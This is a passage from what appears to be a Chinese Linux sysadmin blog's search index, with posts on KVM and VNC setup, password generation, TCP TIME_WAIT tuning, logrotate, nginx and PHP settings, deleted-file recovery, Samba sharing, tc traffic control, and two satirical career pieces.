NAME=br0\n    NM_CONTROLLED=no\n    TYPE=Bridge     # 注意Bridge大小写\n    ONBOOT=yes\n    BOOTPROTO=none\n    BROADCAST=192.168.2.255\n    IPADDR=192.168.2.7\n    NETMASK=255.255.255.0\n    NETWORK=192.168.2.0\n    GATEWAY=192.168.2.1\n```\n\n### 3.2. 将物理接口桥接到桥接器\n\n　　修改eth0的内容（本服务器是用eth0上网的），去掉其IP相关信息，加上“BRIDGE=br0”，将其桥接到br0上；如果是双网卡或是多网卡，照此过程修改：\n\n```sh\nvim /etc/sysconfig/network-scripts/ifcfg-eth0\n\n    DEVICE=eth0\n    NAME=eth0\n    TYPE=Ethernet\n    NM_CONTROLLED=no\n    ONBOOT=yes\n    BRIDGE=br0\n```\n\n### 3.3. 重启网络\n\n```sh\n/etc/init.d/network restart\n```\n\n# 二. 安装并配置VNC服务\n\n## 1. 安装VNC\n\n```sh\nyum install tigervnc tigervnc-server\n```\n\n## 2. 配置VNC\n\n```sh\nvim /etc/sysconfig/vncservers\n\n    VNCSERVERS=\"1:root\"\n    VNCSERVERARGS[2]=\"-geometry 800x600 -nolisten tcp -localhost\"\n```\n\n## 3.设置vnc密码\n\n```sh\nvncpasswd\n```\n\n## 4.启动服务\n\n```sh\n/etc/init.d/vncserver start\n\nchkconfig vncserver on\n```\n\n## 5. 配置QEMU\n\n```sh\nvim /etc/libvirt/qemu.conf\n\n    vnc_listen = \"0.0.0.0\"\n\n    vnc_password = \"xxxxx\"\n```\n\n## 6.重启服务\n\n```sh\n/etc/init.d/libvirtd restart\n```\n\n# 三. 创建虚拟机\n\n## 1. 创建centos虚拟机\n\n```sh\nvirt-install --network bridge=br0 --name=test_centos --ram=2048 --vcpus=2 --disk path=/var/lib/libvirt/images/test_centos.img,size=200 --cdrom /usr/local/src/CentOS-6.7-x86_64-minimal.iso --vnc --vncport=5910 --hvm\n```\n\n　　执行上面命令后通过VNC 连接安装系统\n\n## 2.创建windows虚拟机\n\n```sh\nvirt-install --network bridge=br0 --name=test_xp --ram=2048 --vcpus=2 --disk path=/var/lib/libvirt/images/test_xp.img,size=200 --cdrom /usr/local/src/Deepin-LiteXP-5.10.iso --vnc --vncport=5920 --os-type=Windows\n```\n　　执行上面命令后通过VNC 连接安装系统\n","tags":["kvm"],"categories":["service"]},{"title":"使用命令行生成高强度密码","url":"/2017/06/02/system/使用命令行生成高强度密码/","content":"\n设置一个高强度的密码是非常重要的，这样才能够很好的保护自己的账号或者服务器以及确保自己的数据的安全。通常来说，一个高强度密码至少有 14 个字符，包括大小写字母、数字和特殊字符，并且要牢记永远不用那些字典中的单词。使用长密码比短密码要来的安全，因为密码越长越难猜测。在本文中，我将给你介绍几个不同方法，让你可以在 Linux 命令行下生成一个高强度密码。\n\n<!-- more -->\n\n# 使用 openssl 生成高强度密码\n\n这里使用 openssl 的 rand 方法，它会生成一个 14 位字符的随机字符：\n\n    openssl rand -base64 14\n\n# 使用 urandom 生成高强度密码\n\n这里我们将使用 tr 条件来过滤 /dev/urandom 的输出，从而删掉那些不想要的字符，并打印出第一个出现的 14 位字符。\n\n    < /dev/urandom tr -dc A-Za-z0-9 | head -c14; echo\n\n# 使用 pwgen 生成高强度密码\n\npwgen 是一个生成随机、无特殊含义但可以正常拼读的密码。\n\n安装 pwgen，运行：\n\n    sudo apt-get install pwgen\n\n安装好之后，使用以下命令来生成一个 14 位随机字符：\n\n    pwgen 14 1\n\n你也可以使用以下标记：\n\n* -c 或 --capitalize 生成的密码中至少包含一个大写字母\n* -A 或 --no-capitalize 生成的密码中不含大写字母\n* -n 或 --numerals 生成的密码中至少包含一个数字\n* -0 或 --no-numerals 生成的密码中不含数字\n* -y 或 --symbols 生成的密码中至少包含一个特殊字符\n* -s 或 --secure 生成一个完全随机的密码\n* -B 或 --ambiguous 生成的密码中不含易混淆字符\n* -h 或 --help 输出帮助信息\n* -H 或 --sha1=path/to/file[#seed] 使用指定文件的 sha1 哈希值作为随机生成器\n* -C 按列输出生成的密码\n* -1 不按列输出生成的密码\n* -v 或 --no-vowels 不使用任何元音，以免意外生成让人讨厌的单词\n\n# 使用 gpg 生成高强度密码\n\n我们也可以使用 gpg 工具来生成一个 14 位字符的密码：\n\n    gpg --gen-random --armor 1 14\n\n# 其它方法\n\n当然，可能还有很多方法可以生成一个高强度密码。比方说，你可以添加以下 bash shell 方法到 ~/.bashrc 文件：\n\n```sh\ngenpasswd() { \n    strings /dev/urandom | grep -o '[[:alnum:]]' | head -n 14 | tr -d '\\n'; echo\n}\n```\n当你想要生成一个高强度的随机密码时，运行`genpasswd`就好了。\n","tags":["shell"],"categories":["system"]},{"title":"LINUX下解决netstat查看TIME_WAIT状态过多问题","url":"/2017/05/31/system/LINUX下解决netstat查看TIME-WAIT状态过多问题/","content":"\n\n```sh\n# netstat -an|awk '/tcp/ {print $6}'|sort|uniq -c\n     16 CLOSING\n    130 ESTABLISHED\n    298 FIN_WAIT1\n     13 FIN_WAIT2\n      9 LAST_ACK\n      7 LISTEN\n    103 SYN_RECV\n   5204 TIME_WAIT\n\n状态：描述\nCLOSED：无连接是活动的或正在进行\nLISTEN：服务器在等待进入呼叫\nSYN_RECV：一个连接请求已经到达，等待确认\nSYN_SENT：应用已经开始，打开一个连接\nESTABLISHED：正常数据传输状态\nFIN_WAIT1：应用说它已经完成\nFIN_WAIT2：另一边已同意释放\nITMED_WAIT：等待所有分组死掉\nCLOSING：两边同时尝试关闭\nTIME_WAIT：另一边已初始化一个释放\nLAST_ACK：等待所有分组死掉\n```\n\n<!-- more -->\n \n如发现系统存在大量TIME_WAIT状态的连接，通过调整内核参数解决，\n\n```sh\nvim /etc/sysctl.conf\n```\n\n编辑文件，加入以下内容：\n```sh\nnet.ipv4.tcp_syncookies = 1\nnet.ipv4.tcp_tw_reuse = 1\nnet.ipv4.tcp_tw_recycle = 1\nnet.ipv4.tcp_fin_timeout = 30\n```\n\n然后执行 `/sbin/sysctl -p` 让参数生效。\n \nnet.ipv4.tcp_syncookies = 1 表示开启SYN cookies。当出现SYN等待队列溢出时，启用cookies来处理，可防范少量SYN攻击，默认为0，表示关闭；\n \nnet.ipv4.tcp_tw_reuse = 1 表示开启重用。允许将TIME-WAIT sockets重新用于新的TCP连接，默认为0，表示关闭；\n \nnet.ipv4.tcp_tw_recycle = 1 表示开启TCP连接中TIME-WAIT sockets的快速回收，默认为0，表示关闭。\n \nnet.ipv4.tcp_fin_timeout 修改系統默认的 TIMEOUT 时间\n \n下面附上TIME_WAIT状态的意义：\n \n客户端与服务器端建立TCP/IP连接后关闭SOCKET后，服务器端连接的端口\n \n状态为TIME_WAIT\n \n是不是所有执行主动关闭的socket都会进入TIME_WAIT状态呢？\n \n有没有什么情况使主动关闭的socket直接进入CLOSED状态呢？\n \n主动关闭的一方在发送最后一个 ack 后就会进入 TIME_WAIT 状态 停留2MSL（max segment lifetime）时间这个是TCP/IP必不可少的，也就是“解决”不了的。\n \n也就是TCP/IP设计者本来是这么设计的\n \n主要有两个原因\n \n1。防止上一次连接中的包，迷路后重新出现，影响新连接（经过2MSL，上一次连接中所有的重复包都会消失）\n \n2。可靠的关闭TCP连接\n \n在主动关闭方发送的最后一个 ack(fin) ，有可能丢失，这时被动方会重新发fin, 如果这时主动方处于 CLOSED 状态 ，就会响应 rst 而不是 ack。所以主动方要处于 TIME_WAIT 状态，而不能是 CLOSED 。\n \nTIME_WAIT 并不会占用很大资源的，除非受到攻击。\n \n还有，如果一方 send 或 recv 超时，就会直接进入 CLOSED 状态\n","tags":["调优"],"categories":["system"]},{"title":"logrotate切割日志nginx和php配置","url":"/2017/05/31/service/logrotate切割日志nginx和php配置/","content":"\n\n# nginx配置\n\n```sh\n/gotwo_data/logs/nginx/2mm.cn/*.log {\n        daily\n        missingok\n        rotate 52\n        compress\n        delaycompress\n        notifempty\n        create 644 nginx nginx\n        sharedscripts\n        postrotate\n                [ -f /gotwo_data/logs/nginx/nginx.pid ] && kill -USR1 `cat /gotwo_data/logs/nginx/nginx.pid`\n        endscript\n}\n```\n\n<!-- more -->\n\n# php配置\n\n```sh\n/gotwo_data/logs/php/*.log {\n        daily\n        missingok\n        rotate 52\n        compress\n        delaycompress\n        notifempty\n        create 666 nobody nobody\n        sharedscripts\n        postrotate\n                [ -f /gotwo_data/Application/php/var/run/php-fpm.pid ] && kill -USR1 `cat /gotwo_data/Application/php/var/run/php-fpm.pid`\n        endscript\n}\n```\n","tags":["logrotate"],"categories":["service"]},{"title":"nginx常见问题","url":"/2017/05/31/service/nginx常见问题/","content":"\n# 1.错误日志：warn：an upstream response is buffered to a temporary file\n\n```sh\n解决办法：增加fastcgi_buffers 8 4K;     fastcgi_buffer_size 4K;\n```\n<!-- more -->\n\n# 2. a client request body is buffered to a temporary file\n\n```sh\n解决办法：增加client_max_body_size 2050m;     client_body_buffer_size 1024k;\n```\n\n## Nginx 的 buffer 机制：\n\n对于来自 FastCGI Server 的 Response，Nginx 将其缓冲到内存中，然后依次发送到客户端浏览器。缓冲区的大小由 fastcgi_buffers 和 fastcgi_buffer_size 两个值控制。\n\n比如如下配置：\n\n```sh\nfastcgi_buffers      8 4K;\nfastcgi_buffer_size  4K;\n```\n\nfastcgi_buffers 控制 nginx 最多创建 8 个大小为 4K 的缓冲区，而 fastcgi_buffer_size 则是处理 Response 时第一个缓冲区的大小，不包含在前者中。所以总计能创建的最大内存缓冲区大小是 8*4K+4K = 36k。而这些缓冲区是根据实际的 Response 大小动态生成的，并不是一次性创建的。比如一个 8K 的页面，Nginx 会创建 2*4K 共 2 个 buffers。\n\n当 Response 小于等于 36k 时，所有数据当然全部在内存中处理。如果 Response 大于 36k 呢？fastcgi_temp 的作用就在于此。多出来的数据会被临时写入到文件中，放在这个目录下面。同时你会在 error.log 中看到一条类似 warning：\n\n```\n2010/03/13 03:42:22 [warn] 3994#0: *1 an upstream response is buffered to a temporary file\n/usr/local/nginx/fastcgi_temp/1/00/0000000001 while reading upstream, \nclient: 192.168.1.111,\nserver: www.xxx.cn,\nrequest: \"POST /test.php HTTP/1.1\",\nupstream: \"fastcgi://127.0.0.1:9000\", \nhost: \"xxx.cn\",\nreferrer: \"http://xxx.cn/test.php\"\n```\n\n显然，缓冲区设置的太小的话，Nginx 会频繁读写硬盘，对性能有很大的影响，但也不是越大越好，没意义. \n","tags":["nginx"],"categories":["service"]},{"title":"恢复linux被误删文件","url":"/2017/05/30/system/恢复linux被误删文件/","content":"\n# 一、首先我们先来了解下文件删除原理：\n* 1）linux是通过link的数量来控制文件删除的，只有当一个文件不存在任何link的时候，这个文件才会被删除。一般来说，每个文件都有2个link计数器：i_count和i_nlink。\n* 2）当进程打开了某个文件时，只要该进程保持打开该文件，即使将其删除，它依然存在于磁盘中。这意味着，进程并不知道文件已经被删除，它仍然可以向打开该文件时提供给它的文件描述符进行读取和写入。除了该进程之外，这个文件是不可见的，因为已经删除了其相应的目录索引节点。\n* 3）当你发现你误删除了文件后，要做的第一件事是马上卸载被误删除文件所在的分区，或者以只读的方式来挂载该分区。原因大家都很清楚，文件被删除后，文件中的数据还存在磁盘上，除非存放这些数据的数据块又被操作系统分配出去了。我们这一步就是尽量降低数据块中数据被覆盖的风险，以提高恢复数据成功的比率。\n\n<!-- more -->\n\n# 二、了解完后，实战演练\n\n---\n\n## 方案 1）现在我向大家介绍使用extundelete恢复文件（适合rhel6.X系统的ext4)\n\n### 1.编译安装extundelete-0.2.4\n\n```sh\ntar -jxvf  extundelete-0.2.4.tar.bz2\ncd extundelete-0.2.4\n./configure （这步出现错误，请看下文）\nmount /dev/cdrom /mnt\nrpm -ivh  /mnt/Packages/e2fsprogs-devel-1.41.12-18.el6.x86_64.rpm  （必须安装否则，前面./configure报错）\n./configure （成功）\nmake && make install\n```\n\n### 2.软件安装完毕，下面我们来恢复文件吧\n\n```sh\nmkdir recover\ncd recover\nextundelete  /dev/sda4 --inode  2  （看到你所删除的文件）\nextundelete  /dev/sda4 -restore-inode 15 （按对应的节点来恢复文件）\nextundelete  /dev/sda4 -restore-file  a.txt   （按对应文件名来恢复文件）\nextundelete  /dev/sda4 -restore-dirctory etc  （按对应的目录，这里我以etc目录）\nextundelete  /dev/sda4 -restore-all （全部恢复）\n```\n\n---\n\n## 方案2）使用lsof自带一个的神秘功能\n\n　　原理：大多数与 lsof 相关的信息都存储于以进程的 PID命名的目录中,假如由于误操作将/var/log/messages文件删除掉了，那么这时要将/var/log/messages文件恢复的方法如下：\n\n　　首先使用lsof来查看当前是否有进程打开/var/logmessages文件，如下：\n\n```sh\nlsof |grep /var/log/messages\n\nsyslogd 1283 root 2w REG 3,3 5381017 1773647 /var/log/messages (deleted)\n```\n\n　　从上面的信息可以看到 PID 1283（syslogd）打开文件的文件描述符为 2。同时还可以看到/var/log/messages已经标记被删除了。因此我们可以在 /proc/1283/fd/2 （fd下的每个以数字命名的文件表示进程对应的文件描述符）中查看相应的信息，如下：\n\n```sh\nhead -n 10 /proc/1283/fd/2\n\nAug 4 13:50:15 holmes86 syslogd 1.4.1: restart.\nAug 4 13:50:15 holmes86 kernel: klogd 1.4.1, log source = /proc/kmsg started.\nAug 4 13:50:15 holmes86 kernel: Linux version 2.6.22.1-8 (root@everestbuilder.linux-ren.org)\n(gcc version 4.2.0) #1 SMP Wed Jul 18 11:18:32 EDT 2007 Aug 4 13:50:15 holmes86 kernel:\nBIOS-provided physical RAM map: Aug 4 13:50:15 holmes86 kernel: BIOS-e820:\n0000000000000000 - 000000000009f000 (usable) Aug 4 13:50:15 holmes86 kernel: BIOS-e820:\n000000000009f000 - 00000000000a0000 (reserved) Aug 4 13:50:15 holmes86 kernel:\nBIOS-e820: 0000000000100000 - 000000001f7d3800 (usable) Aug 4 13:50:15 holmes86 kernel:\nBIOS-e820: 000000001f7d3800 - 0000000020000000 (reserved) Aug 4 13:50:15 holmes86\nkernel: BIOS-e820: 00000000e0000000 - 00000000f0007000 (reserved) Aug 4 13:50:15\nholmes86 kernel: BIOS-e820: 00000000f0008000 - 00000000f000c000 (reserved)\n```\n\n　　从上面的信息可以看出，查看 /proc/8663/fd/15 就可以得到所要恢复的数据。如果可以通过文件描述符查看相应的数据，那么就可以使用 I/O 重定向将其复制到文件中，如:cat /proc/1283/fd/2 > /var/log/messages对于许多应用程序，尤其是日志文件和数据库，这种恢复删除文件的方法非常有用。\n\n---\n\n## 方案3）使用ext3grep恢复文件（适合rhel5.X系统的ext3)\n\n### 1. 编译安装ext3grep-0.10.1\n\n```sh\ntar -jxvf  ext3grep-0.10.1.tar.gz\ncd ext3grep-0.10.1\n./configure\nmake && make install\n```\n\n### 2. 软件安装完毕，下面我们来恢复文件吧\n\n```sh\nmkdir recover\ncd recover\next3grep /dev/your-device --restore-filepath/to/your/file/filename\n```\n\n　　需要注意的是，上面的文件路径，是在该分区上文件路径。假设我们要恢复/dev/sda3分区上文件，这个分区原来的安装点是/home，现在想恢复文件/home/easwy/vi/tips.xml，那么输入的命令应该是：\n\n```sh\next3grep /dev/sda3--restore-file easwy/vi/tips.xml\n```\n\n　　所有恢复的文件都会放在当前目下在`RESTORED_FILES`目录下，大小也一样，这里`RESTORED_FILES`目录是执行ext3grep的当前目录下\n\n　　如果你忘记了文件名，或者你误删除的是一个目录而你无法记全该目录中的文件，你可以先用下面的命令查询一下文件名：\n\n```sh\next3grep /dev/sda3 --dump-names | tee filename.txt\n```\n\n　　上面的命令把ext3grep命令的输出记录到文件filename.txt中，你可以慢慢查看，或者使用grep命令过滤出你需要的信息。\n\n　　当你知道了目录/文件的信息后，就可以用上面说的命令进行恢复了。\n\n　　复所有文件和目录，但是目录的话，如果删除时间较长，不一定能完全恢复，压缩文件一般都能恢复\n\n```sh\next3grep /termite/cc-disk --restore-all\next3grep /dev/sda3  --ls --inode 2 创建扫描分区文件：sda5.ext3grep.stage1和sda5.ext3grep.stage2\n```\n\n　　如果想要重新生成可以删除这个两个文件，再次执行这条命令。另外当第一次执行ext3grep /dev/sda3 --restore-file test/a.txt进行还原时也会自动生成扫描分区文件。\n","tags":["数据恢复"],"categories":["system"]},{"title":"修改PHP上传文件大小限制","url":"/2017/05/30/service/修改PHP上传文件大小限制/","content":"\n# 一.配置php.ini文件 （以上传500M以下大小的文件为例）\n\n　　查找以下选项并修改:\n\n```sh\nfile_uploads = On ;打开文件上传选项\nupload_max_filesize = 500M ;上传文件上限\n```\n\n<!-- more -->\n\n　　如果要上传比较大的文件，仅仅以上两条还不够，必须把服务器缓存上限调大，把脚本最大执行时间变长\n\n```sh\npost_max_size = 500M ;post上限\nmax_execution_time = 1800 ; Maximum execution time of each script, in seconds脚本最大执行时间\nmax_input_time = 1800 ; Maximum amount of time each script may spend parsing request data\nmemory_limit = 128M ; Maximum amount of memory a script may consume (128MB)内存上限\n```\n\n# 二.修改nginx配置\n\n　　需要在对应的虚拟主机配置中修改　`client_max_body_size` 参数的值\n\n```sh\nclient_max_body_size 500m;\n```\n","tags":["php"],"categories":["service"]},{"title":"Windows与Linux共享文件夹互相访问","url":"/2017/05/29/service/ Windows与Linux共享文件夹互相访问 /","content":"\n# 首先安装并配置软件samba\n\n```sh\nsudo yum install samba samba-client  \nvim /etc/samba/smb.conf  \n      \n找到security这行并将#注释符号去掉改成  \nsecurity = share     #共享模式  \n      \n添加如下代码：  \n      \n[share]  \ncomment = share  \npath = /home/test          #设置共享文件夹目录  \nbrowseable = yes  \nguest ok = yes  \nwritable = yes  \n\nservice smb start  \nservice smbd start   (ubuntu)  \n```\n<!-- more -->\n\n## （1）在windows下访问Linux共享：\n\n直接在windows运行里输入\\\\192.168.16.128即可访问linux共享资源，并且不需要密码。\n\n## （2）在linux下访问windows共享：\n```sh\nsmbclient -L 192.168.16.1 -U xiaoxing   # 查看共享了那些目录，由此知道主机名为XIAOXING-PC\n\nsmbclient //192.168.16.1/Users -U xiaoxing     输入windows密码即可进入\n```\n\n直接挂载windows共享目录\n\n```sh\nsudo mount -t smbfs -o username=xiaoxing,password=123456   //XIAOXING-PC/system /mnt/win/\n或者：\nsudo mount -t smbfs -o username=xiaoxing,password=123456   //192.168.16.1/system /mnt/win/\n或者：\nsudo mount -t smbfs -o username=xiaoxing,password=123456,ip=192.168.16.1 //XIAOXING-PC/system /mnt/win/\n```\n\n注意：\n\n如果出现如下错误：\n\n```sh\nmount: unknown filesystem type ’smbfs’\n```\n说明系统已经不能识别smbfs文件系统了，查资料说RHE5的kernel已经不再支持smbfs，而改用Common Internet File Systemcifs(cifs)取代了原有的smbfs，所以命令就改为:\n\n```sh\nsudo mount -t cifs -o username=xiaoxing,password=123456   //192.168.16.1/system /mnt/win/\n```\n解开挂载\n\n断开刚才挂载在linux /mnt/win/路径上的winodws共享文件夹。\n```sh\nsudo umount /mnt/win/\n```\n","tags":["samba"],"categories":["service"]},{"title":"系统运维工程师装逼完全指南","url":"/2017/05/28/life/系统运维工程师装逼完全指南/","content":"\n\n\n1、全球化的认证有助于提升逼格，什么OCM、CCIE、RHCA、CISSP等等能考都考，再不济，也要有一张系统架构设计师或者网络规划设计师的信产部认证。每过一个认证，逼格提升一档。\n\n<!-- more -->\n\n2、TCP/IP协议、Linux内核深入研究、ORACLE大全等等之类的超过1千页大本头的书能有效提升B格，一定要放手边。不懂不要紧，别人能看见就行了。真有人跟你谈这些，也别担心装B失败，谈网络就从TCP的实现谈起，谈Linux就从内存的管理谈起，谈数据库就从各数据库SQL语句的源码实现谈起。如果有人跟你谈MS的东西也不要紧，就说自己之前有多年的微软的工作经历，外包的也算。反正也不会有查。有人非要跟你谈硬件，最次也要从计算机部件分类谈起吧。\n\n3、大众化的东西要少用。能用ATS，就别用squid；能用postgresql，就别用MySQL；坚信什么nginx、lighty这种webserver要比apache好一万倍，而且apache能实现的功能，这些都能实现，不行就自己写模块、写扩展。实在要用apache，也别用高版本，抱死1.3的系统。有人要是问起，就说这是基于1.3的版是自己深度二次开发版本。实在要找不到的话也不要紧，没事在sf、oschina上看看什么下载量少的项目，背背项目简介啥的。不得不说，这两个网站太贴心，分类都给你做好了。总之，小众的东西能很有效的提升你的装逼级别。\n\n4、写脚本的话，别用grep、sort 、uniq、管道这类命令。使用纯粹的awk、sed的实现，长度不要紧，阅读性、性能也不是问题。功能实现了，别人都还不懂这就是关键。如果真有人来请教，也要装出一副很简单的表情。切记不要摇头尾巴晃。就算是你是从《sed和awk》这种书上抄你自己也不一定能看懂的代码。\n\n5、虽然会shell，但也要少用shell。初级装逼者，系统管理会首选perl、python、php这类3p的工具，而且要对shell这种语言有一种不屑。把什么性能、移植性、面向对象要常挂嘴边。如果还能再写几行什么erlang、ruby、lua这类语言做系统管理，绝对是装B神器，也是中级装逼的标准。高级装逼者会有Haskell这类函数式语言进行系统管理，这绝对是装B的B2轰炸机呀。当然，资深装逼者会返璞归真，使用面向对象进行shell编程。对，你没看错，是使用OO进行shell编程。\n\n6、当谈到Redhat、ubuntu这类大众发行版本时，就回复一个字“切！”LFS、Gentoo这类系统绝对是装逼的首选。不为什么，就为在无穷尽的编译中找到属于自己的快感。如果非装大众发行版，也要从开机画面、登陆提示等等地方打自己上深刻的烙印。装逼的寂寞岂是一般人能懂的。\n\n7、对什么checkpoint，juniper等表示不屑。必须天天把iptabes的链和表都挂在嘴边，尤其是mangle表。原则上对商用产品的一律不屑一顾，什么f5，radware一律自己开发实现。至于意外的将自己关在外面的事情一定要严格遵守各自公司的保密协议。\n\n8、对于操作终端呢，像SecureCRT、xshell这种绝对是不用的，一定要用最原始的，什么黑屏绿字只是初级装逼者的水平，中高级则是Alpha半透明终端，桌面背景在设置个全球internet流量趋势图。让你根本就不知道他天天对着屏幕在敲什么东西。有事没事编译一些大型软件，看着翻滚的屏幕做思考状。\n\n9、名片的title一定要是系统架构师，没有名片也不要紧，什么QQ签名、人人状态、微博简介上，有人看的地方一定要写上。这些都是提升B格的好地方。\n\n10、初级装逼谈流量、PV、自动化；中级装逼谈流程、谈规范，什么ITIL、ITSM要常挂嘴边；高级装逼谈架构、谈模式；资深装逼则谈合同、谈成本。\n\n11、混圈子对装逼来非常有必要的。什么XX沙龙、XX架构师大会、XX优化大会之类必要是常客，露个B脸就行。基本原则就是跟搞系统谈网络，跟搞网络的谈数据库，跟搞数据库的谈安全……对方不懂什么就谈什么对就了\n\n12、最后，骨灰级早就超出三界外，不在五行中，他们注定有着传奇的色彩。他们正忙于对装逼者们进行职业发展规划。装逼助理、初级装逼、高级装逼、资深装逼、装逼总监直至CBO。如果发展了到了CBO，那么你一定是一位惊天地、泣鬼神的一代B神，一统江湖的教主，供万千iBer敬仰。darling，我很看好你哟！","tags":["职业"],"categories":["life"]},{"title":"运维人装逼指南大全","url":"/2017/05/28/life/运维人装逼指南大全/","content":"\n\n曾经有一首诗是这么写的\n\n> 装逼，是一种态度??\n\n> 装逼的人生不可限量\n\n> 装逼如煲汤\n\n> 遇到烹制的高手，逼格立马飙升\n\n<!-- more -->\n\n装逼，已被业界大神誉为当代职场人的基本素养\n\n可是\n\n网上流传的装逼指南一大把\n\n唯独缺少咱运维人的这一发\n\n今天线哥就帮大家来扒一扒\n\n咱们一起把这装逼宝典传承下\n\n\n　　话说，运维人拥有天然装逼优势，面对无数迭代升级的软硬件，数都数不过来的各类技术，互联网、云计算、大数据的热潮，跑断腿的各类行业大会……这些都为我们营造了极好的客观条件。\n\n　　可以说，在全民都看你的时代，你不装逼，不仅浪费了你这一身好手段，而且辜负了天恩浩荡呀！\n\n　　线哥虽是运营人，但长期浸淫在运维大咖身边，韬光养晦，苦练内功，总结了历来大神的装逼心得，并且通过实战检验，可谓天下无双，故取名曰《装逼宝典》，以补《葵花宝典》千年缺配。\n\n　　现在很多运维人逼格不高，主要是因其来路不正，“小米+步枪”的时代远去，来路不正永远低人一等。所以一张权威的架构师认证就显得无比重要了，国内比较权威的系统架构设计师或者网络规划设计师的认证要考，国际的什么OCM、CCIE、RHCA、CISSP等等更要考，有了这些证件决定你在哪一个层次装逼，当然了，逼格的飙升也有赖于部分努力。\n\n　　你会发现一些资深装逼手边永远摆着几本大部头的书，看着都瘆人。何谓大部头，什么？几百页的书你也好意思提，至少得上千页，才配称得上大部头。像什么TCP/IP协议、Linux内核研究、ORACLE大全等等。书一定要摆在显眼位置，你不用担心万一有人问起装逼遭遇滑铁卢。如果有人问硬件，你可以从计算机硬件基础谈起，有人问MS的内容，你那几年微软外包工作经历正好派上用场，现在数据库比较热，你可以从SQL语句的源码开聊，网络就谈TCP，Linux就谈内存管理。聊着聊着，你自己都被自己感动了，征服了。\n\n# 跟菜鸟划开界限\n\n　　菜鸟在管理系统上经常选用perl、python、php这些3p工具，你要避开这些工具，另外shell也要少用，当菜鸟问起，你要表现出不屑来。如果做系统管理你要会写几行erlang、ruby、lua这类语言，如果你胆儿够大，可以整一整Haskell这类函数式语言。我敢说，懂一点这个，你绝对把逼装大了。\n\n# 避开大众化路线\n\n　　当别人问你用squid吗？你说你用ATS；当别人问你用MySQL吗？你说你用postgresql；当别人为你用apache吗？你说你用nginx、lighty。如果你发现当别人也在学习这些技术了，你就到sf、oschina网站上看看那些下载量小的项目，多背背项目简介，当他们在你面前炫耀新技术时，你跟他们聊一聊这些项目，这时你发现他们只剩下长大了的嘴。你要记住，越小众的东西越显得高逼格，小众意味着高端，这是历史反复验证的。\n\n# 为自己代言\n\n　　不装逼的人永远不懂装逼人的寂寞，装逼到极致是高冷的，曲高和寡。比如当大家还在谈Redhat、ubuntu这类大众发行版本时，你总是有意无意间避开，别人问你看法的时候，你对此不置一词，反而大谈特谈LFS、Gentoo。因为大众的东西是别人的，扒到属于自己的东西才显得更有张力，会带来不一样的快感呦。\n\n　　很多人写脚本都爱用grep、sort 、uniq这类命令，这类命令的功能比较复杂，而你术业有专攻，使用最纯粹的awk、sed来实现，最关键的是当你用它们实现某些功能，别人都看不懂。别人不懂就会问，而这时你却表现出一副轻描淡写的表情。而这些对于他们来说，就算抄书也不一定真能看懂。\n\n# 设置屏幕放大招\n\n　　操作终端一定要大肆显摆，那种黑屏绿字好莱坞大片式简直弱爆了，你用的是什么，是Alpha半透明终端，最好在桌面设置一个全球internet流量走势图，偶尔对着翻滚的屏幕做深入思考状，谁也不知道你在琢磨什么惊天地泣鬼神的东西。\n\n# 处处留情\n\n　　软硬件都解决了，这时候作为运维人的装逼基础已经够完美了，可是距离互联网大神级别还有距离。这时候你要抓住一切手段营销自己。不要让“网管”这个词在你耳朵边出现，你要时刻在明面暗面提示别人，我是架构师或规划师，把所有能展示自己title的地方都写上，什么名片啊、微信啊、QQ签名、脉脉、拉勾网等等，当然如果你愿意加上”首都在线“的前缀，可能效果会出奇不意。\n\n# 混精英圈子\n\n　　混圈子对于装逼是极为重要的。现在各种大会很多，鱼龙混杂，像什么GMIC、ChinaJoy之类的大会很难找到自己定位，而一般的XX架构师大会、XX优化大会、XX沙龙最多混个脸熟就好了。主要瞄准几个特定场合可获得四两拨千斤的效果，比如什么青年计算机学会论坛，统计之都论坛，以及蝴蝶沙龙，尤其蝴蝶沙龙是一个比较纯粹的架构师聚会，多去混这种场子，争取能演讲，那么你在这个圈子就很接近大神级人物了。\n\n# 精通云计算\n\n　　一般而言，骨灰级的大神被当作信仰一样崇拜，这些人物大都具有传奇色彩，据线哥多年观察，这些人物的思考域比较广，他思考问题具有生态图谱效应，比如做架构师，你一定要多思考云计算，了解SAAS，熟悉PAAS，精通IAAS。尤其关注当前IAAS战略趋势以及差异化发展。当前的经济趋势是企业出海，不管是电商、游戏还是视频企业，都在向海外拓展业务，在倡导全球云计算布局领域中，国内首要关注首都在线，因为这是首家全球一体化云计算服务商，拥有全球私网GPN，通过它能够高效稳定安全连接世界。\n\n　　最后不得不说，装逼是个系统工程，从装逼助理、装逼专员、高级装逼、资深装逼、装逼总监直至CBO。取经之路漫长，你在哪个层级不重要，重要的是，装逼精神不弃，奋斗之路不止。送给万千参透“人生如戏”的职场运维人士们！","tags":["职业"],"categories":["life"]},{"title":"tc命令——Linux基于IP进行流量限速","url":"/2017/05/28/service/tc命令Linux基于IP进行流量限速/","content":"\n# 一、TC原理\n\n　　Linux操作系统中的流量控制器TC（Traffic Control）用于Linux内核的流量控制，主要是通过在输出端口处建立一个队列来实现流量控制。\n\n<!-- more -->\n\n　　接收包从输入接口进来后，经过流量限制丢弃不符合规定的数据包，由输入多路分配器进行判断选择：\n\n* 如果接收包的目的主机是本主机，那么将该包送给上层处理，否则需要进行转发，将接收包交到转发块（Forwarding Block）处理。\n* 转发块同时也接收本主机上层(TCP、UDP等)产生的包，通过查看路由表，决定所处理包的下一跳。\n* 然后，对包进行排列以便将它们送到输出接口。\n\n　　一般只能限制网卡发送的数据包，不能限制网卡接收的数据包，所以可以通过改变发送次序靠控制传输速率。Linux流量控制主要是在输出接口排列时进行处理和实现的。\n\n# 二、TC规则\n\n## 2.1、流量控制方式\n\n　　流量控制包括以下几种方式：\n\n* SHAPING(限制) \n\n　　当流量被限制，它的传输速率就被控制在某个值以下。限制值可以大大小于有效带宽，这样可以平滑突发数据流量，使网络更为稳定。shaping（限制）只适用于向外的流量。\n\n* SCHEDULING(调度)      \n\n　　通过调度数据包的传输，可以在带宽范围内，按照优先级分配带宽。SCHEDULING(调度)也只适于向外的流量。\n\n* POLICING(策略)      \n\n　　SHAPING用于处理向外的流量，而POLICIING(策略)用于处理接收到的数据。\n\n* DROPPING(丢弃)      \n\n　　如果流量超过某个设定的带宽，就丢弃数据包，不管是向内还是向外。\n\n## 2.2、流量控制处理对象\n\n　　流量的处理由三种对象控制，它们是：\n\n* qdisc(排队规则)\n* class(类别)\n* filter(过滤器)\n\n###  QDISC(排队规则)\n\n　　QDisc(排队规则)是queueing discipline的简写，它是理解流量控制(traffic 